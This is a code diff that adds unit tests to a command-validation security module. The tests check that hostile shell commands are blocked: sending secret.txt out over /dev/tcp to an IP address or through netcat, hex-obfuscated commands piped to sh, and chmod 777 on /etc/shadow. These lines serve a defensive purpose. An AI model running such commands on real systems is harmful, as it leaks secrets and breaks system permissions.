@@ -96,6 +96,22 @@ describe('Security', () => {
       const longCommand = 'echo ' + 'a'.repeat(40000);
       expect(() => validateCommand(longCommand)).toThrow('exceeds maximum length');
     });
+
+    it('should detect network exfiltration patterns', () => {
+      expect(() => validateCommand('cat secret.txt > /dev/tcp/1.2.3.4/80')).toThrow('Bash network redirection');
+      expect(() => validateCommand('nc -l 1234 < secret.txt')).toThrow('Netcat file exfiltration');
+    });
+
+    it('should detect obfuscation patterns', () => {
+      expect(() => validateCommand('echo -e "\\x48\\x65\\x6c\\x6c\\x6f"')).toThrow('Hexadecimal obfuscation');
+      // This will be caught by "Piping to sh" rule first, which is also a security win
+      expect(() => validateCommand('printf "\\x6c\\x73" | sh')).toThrow(/printf-based obfuscation|Piping to sh/);
+    });
+
+    it('should detect dangerous system manipulation', () => {
+      expect(() => validateCommand('chmod 777 /etc/shadow')).toThrow('Overly permissive chmod 777');
+      expect(() => validateCommand('chown root:root exploit')).toThrow('chown to root');
+    });
   });
 
   describe('Path Traversal - startsWith bypass prevention', () => {
